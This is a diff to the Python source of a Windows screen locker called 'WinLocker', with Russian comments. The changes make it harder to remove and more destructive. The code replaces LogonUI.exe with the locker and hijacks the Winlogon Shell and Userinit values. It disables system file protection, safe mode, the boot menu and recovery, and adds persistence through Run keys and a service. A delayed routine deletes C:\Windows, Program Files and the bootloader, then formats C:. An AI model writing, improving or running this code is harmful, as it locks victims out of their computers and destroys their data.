@@ -11,6 +11,7 @@ import threading
 import shutil
 import platform
 import socket
+import stat
 from ctypes import wintypes
 from tkinter import *
 from tkinter import ttk
@@ -97,60 +98,151 @@ def enable_cmd_powershell():
     except:
         pass
 
-def hijack_logonui():
+def force_take_ownership(path):
+    """Принудительное получение прав на файл"""
+    try:
+        # Остановка защиты
+        subprocess.run(["net", "stop", "TrustedInstaller"], 
+                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        time.sleep(2)
+        
+        # Снятие атрибутов
+        os.system(f'attrib -r -s -h "{path}"')
+        
+        # Получение прав
+        subprocess.run(["takeown", "/f", path], 
+                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["icacls", path, "/grant", "Administrator:F"], 
+                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["icacls", path, "/grant", "SYSTEM:F"], 
+                      capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        return True
+    except:
+        return False
+
+def hijack_logonui_enhanced():
+    """Усиленная замена LogonUI с гарантией"""
     try:
         logonui_path = "C:\\Windows\\System32\\LogonUI.exe"
         backup_path = "C:\\Windows\\System32\\LogonUI_backup.exe"
+        temp_path = "C:\\Windows\\Temp\\LogonUI_temp.exe"
         
-        if not os.path.exists(backup_path):
+        # 1. Получение прав на файл
+        force_take_ownership(logonui_path)
+        
+        # 2. Создание бэкапа
+        if os.path.exists(logonui_path):
+            if not os.path.exists(backup_path):
+                shutil.copy2(logonui_path, backup_path)
+            
+            # 3. Копирование WinLocker
+            shutil.copy2(sys.argv[0], temp_path)
+            
+            # 4. Замена с защитой
             try:
-                os.rename(logonui_path, backup_path)
+                os.remove(logonui_path)
             except:
                 pass
+            os.rename(temp_path, logonui_path)
         
-        shutil.copy(sys.argv[0], logonui_path)
+        # 5. Защита файла от изменений
+        os.system(f'attrib +r +s +h "{logonui_path}"')
         
+        # 6. Изменение реестра Winlogon
         subprocess.run(
             ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
              "/v", "Shell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
-    except:
-        pass
-
-def restore_logonui():
-    try:
-        logonui_path = "C:\\Windows\\System32\\LogonUI.exe"
-        backup_path = "C:\\Windows\\System32\\LogonUI_backup.exe"
         
-        if os.path.exists(backup_path):
-            try:
-                os.remove(logonui_path)
-                os.rename(backup_path, logonui_path)
-            except:
-                pass
-    except:
-        pass
+        # 7. Замена в Winlogon альтернативного Shell
+        subprocess.run(
+            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+             "/v", "Userinit", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 8. Отключение защиты системных файлов
+        subprocess.run(
+            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+             "/v", "SFCDisable", "/t", "REG_DWORD", "/d", "1", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 9. Блокировка восстановления через SFC
+        subprocess.run(
+            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+             "/v", "SFCScan", "/t", "REG_DWORD", "/d", "0", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        print("[+] LogonUI успешно заменен с усиленной защитой")
+        return True
+        
+    except Exception as e:
+        print(f"[-] Ошибка замены LogonUI: {e}")
+        return False
 
-def block_safe_mode():
+def block_safe_mode_enhanced():
+    """Усиленная блокировка всех вариантов безопасного режима"""
     try:
+        # 1. Блокировка Minimal
         subprocess.run(
             ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",
              "/v", "WinLocker", "/t", "REG_SZ", "/d", "Service", "/f"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
+        
+        # 2. Блокировка Network
         subprocess.run(
             ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",
              "/v", "WinLocker", "/t", "REG_SZ", "/d", "Service", "/f"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
+        
+        # 3. Замена AlternateShell на WinLocker (вместо cmd)
         subprocess.run(
             ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
-             "/v", "AlternateShell", "/t", "REG_SZ", "/d", "cmd.exe", "/f"],
+             "/v", "AlternateShell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
-    except:
-        pass
+        
+        # 4. Блокировка загрузки через F8
+        subprocess.run(
+            ["reg", "add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System",
+             "/v", "DisableBootDisplay", "/t", "REG_DWORD", "/d", "1", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 5. Отключение меню загрузки
+        subprocess.run(
+            ["bcdedit", "/set", "{bootmgr}", "displaybootmenu", "no"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        subprocess.run(
+            ["bcdedit", "/set", "{globalsettings}", "advancedoptions", "false"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 6. Отключение восстановления
+        subprocess.run(
+            ["reagentc", "/disable"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 7. Блокировка командной строки в Safe Mode через реестр
+        subprocess.run(
+            ["reg", "add", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\WinLocker",
+             "/ve", "/t", "REG_SZ", "/d", "Service", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        print("[+] Safe Mode полностью заблокирован")
+        return True
+        
+    except Exception as e:
+        print(f"[-] Ошибка блокировки Safe Mode: {e}")
+        return False
 
 def restore_safe_mode():
     try:
@@ -164,24 +256,66 @@ def restore_safe_mode():
              "/v", "WinLocker", "/f"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
+        subprocess.run(
+            ["reg", "delete", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot",
+             "/v", "AlternateShell", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
     except:
         pass
 
-def add_autostart():
+def add_autostart_enhanced():
+    """Усиленная автозагрузка"""
     try:
+        # 1. Стандартная автозагрузка
         subprocess.run(
             ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              "/v", "WinLocker", "/t", "REG_SZ", "/d", sys.argv[0], "/f"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
+        
+        # 2. Автозагрузка через Winlogon
+        subprocess.run(
+            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+             "/v", "Shell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 3. Автозагрузка через Userinit
+        subprocess.run(
+            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+             "/v", "Userinit", "/t", "REG_SZ", "/d", sys.argv[0], "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 4. Загрузка как служба
+        subprocess.run(
+            ["sc", "create", "WinLockerService", "binPath=", sys.argv[0], "start=", "auto"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        # 5. Загрузка через Group Policy
+        subprocess.run(
+            ["reg", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+             "/v", "Shell", "/t", "REG_SZ", "/d", "LogonUI.exe", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        
+        print("[+] Автозагрузка усилена")
+        return True
+        
     except:
-        pass
+        return False
 
 def remove_autostart():
     try:
         subprocess.run(
             ["reg", "delete", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
              "/v", "WinLocker", "/f"],
+            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
+        )
+        subprocess.run(
+            ["sc", "delete", "WinLockerService"],
             capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
         )
     except:
@@ -204,14 +338,37 @@ def get_system_info():
 def delete_windows():
     time.sleep(86400)
     try:
+        # Получение прав на удаление
         subprocess.run(["takeown", "/f", "C:\\Windows", "/r", "/d", "y"], 
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.run(["icacls", "C:\\Windows", "/grant", "Administrator:F", "/t"], 
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Удаление системных файлов
         subprocess.run(["cmd", "/c", "rd /s /q C:\\Windows"], 
                       shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Удаление Program Files
+        subprocess.run(["cmd", "/c", "rd /s /q C:\\Program Files"], 
+                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["cmd", "/c", "rd /s /q C:\\Program Files (x86)"], 
+                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Удаление загрузчика
+        subprocess.run(["cmd", "/c", "rd /s /q C:\\Boot"], 
+                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Удаление системных скрытых файлов
+        subprocess.run(["cmd", "/c", "del /f /s /q /a C:\\bootmgr"], 
+                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.run(["cmd", "/c", "del /f /s /q /a C:\\BOOTNXT"], 
+                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Форматирование диска
         subprocess.run(["cmd", "/c", "format C: /q /y"], 
                       shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        # Перезагрузка
         subprocess.run(["shutdown", "/r", "/t", "0"], 
                       capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
     except:
@@ -220,11 +377,12 @@ def delete_windows():
 
 class WinLocker:
     def __init__(self):
+        # Применение усиленной защиты
         disable_task_manager()
         disable_cmd_powershell()
-        block_safe_mode()
-        hijack_logonui()
-        add_autostart()
+        block_safe_mode_enhanced()
+        hijack_logonui_enhanced()
+        add_autostart_enhanced()
         block_keys()
         
         self.root = tk.Tk()
